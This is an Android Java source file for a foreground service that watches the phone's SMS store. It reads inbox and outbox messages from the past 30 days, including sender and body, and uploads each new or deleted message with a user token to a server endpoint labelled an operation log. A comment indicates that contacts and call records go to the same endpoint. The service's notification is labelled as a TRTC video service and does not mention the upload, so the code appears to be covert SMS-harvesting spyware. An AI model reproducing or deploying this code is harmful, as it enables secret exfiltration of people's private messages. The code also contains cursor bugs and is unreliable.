package com.example.myapplication.service;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ServiceUtils;
import com.example.myapplication.Contract.ContractInterface;
import com.example.myapplication.Presenter.MyPresenter;
import com.example.myapplication.R;
import com.example.myapplication.bean.SMSBean;
import com.example.myapplication.dao.DbDao;
import com.example.myapplication.utile.DataUtile;
import com.example.myapplication.utile.SharedPreferencesUtils;
import com.google.gson.Gson;
import com.tencent.trtc.debug.Constant;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 短信监听
 */
public class SmsService extends Service implements ContractInterface.View {
    private ContractInterface.Presenter presenter;
    private DbDao mDbDao;
    public static void start(Context context) {
        if (ServiceUtils.isServiceRunning(SmsService.class)) {
            return;
        }
        Intent service = new Intent(context, SmsService.class);
        if (Build.VERSION.SDK_INT >= 28) {
            context.startForegroundService(service);
        }
    }

    private static final int NOTIFICATION_ID = 100;

    @Override
    public void onCreate() {
        super.onCreate();
        LogUtils.e("onCreate");
        presenter = new MyPresenter(this);
        mDbDao=new DbDao(this);
        Notification notification = createForegroundNotification();
        startForeground(NOTIFICATION_ID, notification);
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms/"), true, mObserver);
    }

    private SmsObserver mObserver = new SmsObserver(
            new Handler());
    String Type="收件箱";
    // ContentObserver监听器类
    private final class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            LogUtils.e("短信发生变化");
            List<String> list =new ArrayList<>();
            Gson gson=new Gson();
            if(Type.equals("收件箱")){
                list.clear();
                list=getSmsInPhone();
                List<String> SMSReceipt =new ArrayList<>();
                SMSReceipt.addAll(mDbDao.queryData("接收"));
                List<String> SMSsend=new ArrayList<>();
                SMSsend.addAll(mDbDao.queryData("发送"));
                LogUtils.e(list.size()+"**********"+SMSReceipt.size()+"--------"+SMSsend.size());
                for (int i = 0; i < list.size(); i++) {
                    if (list.get(i).equals("no result!")){
                        list.remove(i);
                    }
                }
                if (list.size()==SMSReceipt.size()){
                    Type="发件箱";
                    list.clear();
                    list=getSmsInPhone1();
                }else {
                    if (list.size() > SMSReceipt.size()) {//新增
                        SMSBean smsBean=gson.fromJson(list.get(list.size()-1),SMSBean.class);
                        smsBean.setDelete(false);
                        String content=gson.toJson(smsBean);
                        LogUtils.e(content);
                        Map<String, Object> map = new HashMap<>();
                        map.put("type", "3");//type="1"来表示通讯录，"2"=电话，"3"=短信
                        map.put("content", content);
                        presenter.presenter(map, "/api/user/addOperateLog?","POST", DataUtile.getMyToken()+"");
                        mDbDao.insertData(list.get(list.size()-1),"接收");
                    } else if (list.size() < SMSReceipt.size()) {//删除
                        SMSBean smsBean=gson.fromJson(SMSReceipt.get(SMSReceipt.size()-1),SMSBean.class);
                        smsBean.setDelete(true);
                        String content=gson.toJson(smsBean);
                        LogUtils.e(content);
                        Map<String, Object> map = new HashMap<>();
                        map.put("type", "3");//type="1"来表示通讯录，"2"=电话，"3"=短信
                        map.put("content", content);
                        presenter.presenter(map, "/api/user/addOperateLog?","POST", DataUtile.getMyToken()+"");
                        if (mDbDao.hasData(SMSReceipt.get(SMSReceipt.size()-1))){
                            mDbDao.delete(SMSReceipt.get(SMSReceipt.size()-1));
                        }
                    }
                }
            }
            if (Type.equals("发件箱")){
                list.clear();
                list=getSmsInPhone1();
                Type="收件箱";
                List<String> SMSsend=new ArrayList<>();
                SMSsend.addAll(mDbDao.queryData("发送"));
                for (int i = 0; i < list.size(); i++) {
                    if (list.get(i).equals("no result!")){
                        list.remove(i);
                    }
                }
                if (list.size() < SMSsend.size()) {//新增
                        SMSBean smsBean=gson.fromJson(list.get(list.size()-1),SMSBean.class);
                        smsBean.setDelete(false);
                        String content=gson.toJson(smsBean);
                        LogUtils.e(content);
                        Map<String, Object> map = new HashMap<>();
                        map.put("type", "3");//type="1"来表示通讯录，"2"=电话，"3"=短信
                        map.put("content", content);
                        presenter.presenter(map, "/api/user/addOperateLog?","POST", DataUtile.getMyToken()+"");
                        mDbDao.insertData(list.get(list.size()-1),"发送");
                } else if (list.size() > SMSsend.size()) {//删除
                        SMSBean smsBean=gson.fromJson(SMSsend.get(SMSsend.size()-1),SMSBean.class);
                        smsBean.setDelete(true);
                        String content=gson.toJson(smsBean);
                        LogUtils.e(content);
                        Map<String, Object> map = new HashMap<>();
                        map.put("type", "3");//type="1"来表示通讯录，"2"=电话，"3"=短信
                        map.put("content", content);
                        presenter.presenter(map, "/api/user/addOperateLog?","POST", DataUtile.getMyToken()+"");
                    if (mDbDao.hasData(SMSsend.get(SMSsend.size()-1))){
                        mDbDao.delete(SMSsend.get(SMSsend.size()-1));
                    }
                }else {
                    LogUtils.e(list.get(list.size()-1)+"***********");
                    SMSBean smsBean=gson.fromJson(list.get(list.size()-1),SMSBean.class);
                    smsBean.setDelete(false);
                    String content=gson.toJson(smsBean);
                    LogUtils.e(content);
                    Map<String, Object> map = new HashMap<>();
                    map.put("type", "3");//type="1"来表示通讯录，"2"=电话，"3"=短信
                    map.put("content", content);
                    presenter.presenter(map, "/api/user/addOperateLog?","POST", DataUtile.getMyToken()+"");
                    mDbDao.insertData(list.get(list.size()-1),"发送");
                }
            }

            String[] strings = new String[list.size()];
            for (int i = 0; i < list.size(); i++) {
                strings[i] = list.get(i);
            }
            SharedPreferencesUtils.setSharedPreference("SMSAll", strings, SmsService.this);
        }
        @SuppressLint("Range")
        public List<String > getSmsInPhone() {
            final String SMS_URI_ALL = "content://sms/"; // 所有短信
            final String SMS_URI_INBOX = "content://sms/inbox"; // 收件箱
            final String SMS_URI_SEND = "content://sms/sent"; // 已发送
            final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
            final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
            final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
            final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表
            List<String > smsBeanList=new ArrayList<>();
            Gson gson=new Gson();
            try {
                Uri uri = Uri.parse(SMS_URI_INBOX);
                String[] projection = new String[] { "_id", "address", "subject",
                        "body", "date", "type", };
                Cursor cur = getContentResolver().query(uri, projection, null,
                        null, "date desc"); // 获取手机内部短信
                Uri uri1 = Uri.parse(SMS_URI_OUTBOX);
                Cursor cur1 = getContentResolver().query(uri, projection, null,
                        null, "date desc"); // 获取手机内部短信
                // 获取短信中最新的未读短信
                // Cursor cur = getContentResolver().query(uri, projection,
                // "read = ?", new String[]{"0"}, "date desc");
                if (cur.moveToFirst()) {
                    Type="收件箱";
                    int index_Address = cur.getColumnIndex("address");
                    int subject = cur.getColumnIndex("subject");
                    int index_Body = cur.getColumnIndex("body");
                    int index_Date = cur.getColumnIndex("date");
                    int index_Type = cur.getColumnIndex("type");
                    do {
                        String strAddress = cur.getString(index_Address);
                        String  subjects = cur.getString(subject);
                        String strbody = cur.getString(index_Body);
                        long longDate = cur.getLong(index_Date);
                        int intType = cur.getInt(index_Type);

                        SimpleDateFormat dateFormat = new SimpleDateFormat(
                                "yyyy-MM-dd hh:mm:ss");
                        Date d = new Date(longDate);
                        String strDate = dateFormat.format(d);

                        String strType = "";
                        if (intType == 1) {
                            strType = "接收";
                        } else if (intType == 2) {
                            strType = "发送";
                        } else if (intType == 3) {
                            strType = "草稿";
                        } else if (intType == 4) {
                            strType = "发送";
                        } else if (intType == 5) {
                            strType = "发送失败";
                        } else if (intType == 6) {
                            strType = "待发送列表";
                        } else if (intType == 0) {
                            strType = "所以短信";
                        } else {
                            strType = "null";
                        }
                        if (DataUtile.getTimeRange(strDate,DataUtile.getdataTime())<30){
                            SMSBean smsBean=new SMSBean();
                            smsBean.setAddress(strAddress);
                            smsBean.setBody(strbody);
                            smsBean.setTime(strDate);
                            smsBean.setType(strType);
                            String contents=gson.toJson(smsBean);
                            smsBeanList.add(contents);
                        }

                    } while (cur.moveToNext());

                    if (!cur.isClosed()) {
                        cur.close();
                        cur = null;
                    }
                } else if (cur1.moveToFirst()){
                    Type="发件箱";
                    int index_Address = cur.getColumnIndex("address");
                    int subject = cur.getColumnIndex("subject");
                    int index_Body = cur.getColumnIndex("body");
                    int index_Date = cur.getColumnIndex("date");
                    int index_Type = cur.getColumnIndex("type");
                    do {
                        String strAddress = cur.getString(index_Address);
                        String  subjects = cur.getString(subject);
                        String strbody = cur.getString(index_Body);
                        long longDate = cur.getLong(index_Date);
                        int intType = cur.getInt(index_Type);

                        SimpleDateFormat dateFormat = new SimpleDateFormat(
                                "yyyy-MM-dd hh:mm:ss");
                        Date d = new Date(longDate);
                        String strDate = dateFormat.format(d);

                        String strType = "";
                        if (intType == 1) {
                            strType = "接收";
                        } else if (intType == 2) {
                            strType = "发送";
                        } else if (intType == 3) {
                            strType = "草稿";
                        } else if (intType == 4) {
                            strType = "发送";
                        } else if (intType == 5) {
                            strType = "发送失败";
                        } else if (intType == 6) {
                            strType = "待发送列表";
                        } else if (intType == 0) {
                            strType = "所以短信";
                        } else {
                            strType = "null";
                        }
                        if (DataUtile.getTimeRange(strDate,DataUtile.getdataTime())<30){
                            SMSBean smsBean=new SMSBean();
                            smsBean.setAddress(strAddress);
                            smsBean.setBody(strbody);
                            smsBean.setTime(strDate);
                            smsBean.setType(strType);
                            String contents=gson.toJson(smsBean);
                            smsBeanList.add(contents);
                        }

                    } while (cur.moveToNext());

                    if (!cur.isClosed()) {
                        cur.close();
                        cur = null;
                    }
                }else {
                    smsBeanList.add("no result!");
                }

            } catch (Exception ex) {
                LogUtils.e("SQLiteException in getSmsInPhone"+ ex.getMessage());
            }
            return smsBeanList;
        }
        public List<String > getSmsInPhone1() {
            final String SMS_URI_ALL = "content://sms/"; // 所有短信
            final String SMS_URI_SEND = "content://sms/sent"; // 已发送
            final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
            final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
            final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
            final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表
            List<String > smsBeanList=new ArrayList<>();
            Gson gson=new Gson();
            try {
                String[] projection = new String[] { "_id", "address", "subject",
                        "body", "date", "type", };
                Uri uri1 = Uri.parse(SMS_URI_OUTBOX);
                Cursor cur1 = getContentResolver().query(uri1, projection, null,
                        null, "date desc"); // 获取手机内部短信
                // 获取短信中最新的未读短信
                // Cursor cur = getContentResolver().query(uri, projection,
                // "read = ?", new String[]{"0"}, "date desc");
                if (cur1.moveToFirst()){
                    Type="发件箱";
                    int index_Address = cur1.getColumnIndex("address");
                    int subject = cur1.getColumnIndex("subject");
                    int index_Body = cur1.getColumnIndex("body");
                    int index_Date = cur1.getColumnIndex("date");
                    int index_Type = cur1.getColumnIndex("type");
                    do {
                        String strAddress = cur1.getString(index_Address);
                        String  subjects = cur1.getString(subject);
                        String strbody = cur1.getString(index_Body);
                        long longDate = cur1.getLong(index_Date);
                        int intType = cur1.getInt(index_Type);

                        SimpleDateFormat dateFormat = new SimpleDateFormat(
                                "yyyy-MM-dd hh:mm:ss");
                        Date d = new Date(longDate);
                        String strDate = dateFormat.format(d);

                        String strType = "";
                        if (intType == 1) {
                            strType = "接收";
                        } else if (intType == 2) {
                            strType = "发送";
                        } else if (intType == 3) {
                            strType = "草稿";
                        } else if (intType == 4) {
                            strType = "发送";
                        } else if (intType == 5) {
                            strType = "发送失败";
                        } else if (intType == 6) {
                            strType = "待发送列表";
                        } else if (intType == 0) {
                            strType = "所以短信";
                        } else {
                            strType = "null";
                        }
                        if (DataUtile.getTimeRange(strDate,DataUtile.getdataTime())<30){
                            SMSBean smsBean=new SMSBean();
                            smsBean.setAddress(strAddress);
                            smsBean.setBody(strbody);
                            smsBean.setTime(strDate);
                            smsBean.setType(strType);
                            String contents=gson.toJson(smsBean);
                            smsBeanList.add(contents);
                        }

                    } while (cur1.moveToNext());

                    if (!cur1.isClosed()) {
                        cur1.close();
                        cur1 = null;
                    }
                }else {
                    smsBeanList.add("no result!");
                }

            } catch (Exception ex) {
                LogUtils.e("SQLiteException in getSmsInPhone"+ ex.getMessage());
            }
            return smsBeanList;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LogUtils.e("onDestroy");
        getContentResolver().unregisterContentObserver(mObserver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new Binder();
    }

    private Notification createForegroundNotification() {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        String notificationChannelId = "notification_channel_id_01";
        // Android8.0以上的系统，新建消息通道
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            //用户可见的通道名称
            String channelName = "TRTC Foreground Service Notification";
            int importance = NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel notificationChannel =
                    new NotificationChannel(notificationChannelId, channelName, importance);
            notificationChannel.setDescription("Channel description");
            notificationChannel.setVibrationPattern(new long[]{0, 1000, 500, 1000});
            notificationChannel.enableVibration(true);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        if (Constant.isShow) {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, notificationChannelId);
            builder.setSmallIcon(R.mipmap.app_icon);
            builder.setContentTitle(getString(R.string.app_name));
            builder.setContentText("运行中");
            builder.setWhen(System.currentTimeMillis());
            return builder.build();
        } else {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, notificationChannelId);
            builder.setSmallIcon(R.mipmap.app_icon);
            builder.setContentTitle(getString(R.string.app_name));
            builder.setContentText("运行中");
            builder.setWhen(System.currentTimeMillis());
            return builder.build();
        }
    }

    //请求接口，上传数据
    @Override
    public void View(String o) {

    }
}
